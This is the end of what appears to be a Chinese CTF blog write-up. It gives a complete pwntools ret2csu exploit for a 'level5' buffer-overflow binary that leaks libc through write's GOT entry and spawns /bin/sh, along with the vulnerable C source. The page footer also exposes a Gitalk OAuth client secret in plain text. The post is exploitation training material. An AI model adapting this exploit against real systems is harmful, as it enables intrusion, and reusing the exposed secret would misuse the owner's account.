+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context.log_level &#x3D; &#39;debug&#39;</span><br><span class="line"></span><br><span class="line">p &#x3D; process(&quot;.&#x2F;level5&quot;)</span><br><span class="line">elf &#x3D; ELF(&quot;.&#x2F;level5&quot;)</span><br><span class="line"></span><br><span class="line">csu_1_addr &#x3D; 0x00000000004005f0</span><br><span class="line">csu_2_addr &#x3D; 0x0000000000400606</span><br><span class="line"></span><br><span class="line">write_got &#x3D; elf.got[&quot;write&quot;]</span><br><span class="line">read_got &#x3D; elf.got[&quot;read&quot;]</span><br><span class="line">main_addr &#x3D; elf.symbols[&quot;main&quot;]</span><br><span class="line">bss_base &#x3D; elf.bss()</span><br><span class="line"></span><br><span class="line">def csu(rbx, rbp, r12, r13, r14, r15, last):</span><br><span class="line">    pld &#x3D; [&#39;a&#39;*0x80,&#39;b&#39;*8,p64(csu_2_addr),&#39;\x00&#39;*8,p64(rbx),p64(rbp),p64(r12),p64(r13),p64(r14),p64(r15),p64(csu_1_addr),&#39;\x00&#39;*0x38,p64(last)]</span><br><span class="line">    payload &#x3D; flat(pld)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">p.recvuntil(&quot;World\n&quot;)</span><br><span class="line">csu(0,1,write_got,1,write_got,8,main_addr)</span><br><span class="line">sleep(1)</span><br><span class="line"></span><br><span class="line">libc_write &#x3D; u64(p.recv(8))</span><br><span class="line">libc &#x3D; LibcSearcher(&quot;write&quot;,libc_write)</span><br><span class="line"></span><br><span class="line">libc_base &#x3D; libc_write - libc.dump(&quot;write&quot;)</span><br><span class="line"></span><br><span class="line">libc_sys &#x3D; libc_base + libc.dump(&quot;system&quot;)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&quot;World\n&quot;)</span><br><span class="line">csu(0,1,read_got,0,bss_base,16,main_addr)</span><br><span class="line">sleep(1)</span><br><span class="line">#pause()</span><br><span class="line"></span><br><span class="line">p.send(flat([p64(libc_sys),&#39;&#x2F;bin&#x2F;sh\x00&#39;]))</span><br><span class="line">p.recvuntil(&#39;Hello, World\n&#39;)</span><br><span class="line">csu(0,1,bss_base,bss_base+8,0,0,main_addr)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>完整脚本如上，题目如下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#!c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">void vulnerable_function() &#123;</span><br><span class="line">    char buf[128];</span><br><span class="line">    read(STDIN_FILENO, buf, 512);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char** argv) &#123;</span><br><span class="line">    write(STDOUT_FILENO, &quot;Hello, World\n&quot;, 13);</span><br><span class="line">    vulnerable_function();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/pwn/" rel="tag"># pwn</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2020/02/20/dvwa-1/" rel="prev" title="dvwa漏洞解法">
+                  <i class="fa fa-chevron-left"></i> dvwa漏洞解法
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2020/05/20/docker/" rel="next" title="关于docker的配置与使用">
+                  关于docker的配置与使用 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+  
+  
+  
+
+
+
+      
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+    </div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+      
+
+      
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ma5ker</span>
+</div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">243k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">3:41</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+  
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1.6.2/dist/gitalk.css">
+
+<script>
+NexT.utils.loadComments('#gitalk-container', () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1.6.2/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : '0530768cd3819c29f055',
+      clientSecret: '9465920674abd65e54adf115c57771a78911b8f4',
+      repo        : 'blog-comments',
+      owner       : 'Ma5ker',
+      admin       : ['Ma5ker'],
+      id          : 'ab625d992f8359c2672c0ca4f648e30f',
+        language: '',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/live2dw/assets/koharu.model.json"},"display":{"position":"right","width":85,"height":200,"hOffset":60,"vOffset":40},"mobile":{"show":true,"scale":0.3,"motion":true},"neat_enable":true,"neat_html":{"enable":true,"exclude":null},"neat_css":{"enable":true,"exclude":["**/*.min.css"]},"neat_js":{"enable":true,"mangle":true,"output":null,"compress":null,"exclude":["**/*.min.js","**/jquery.fancybox.pack.js","**/index.js","**/love.js"]},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
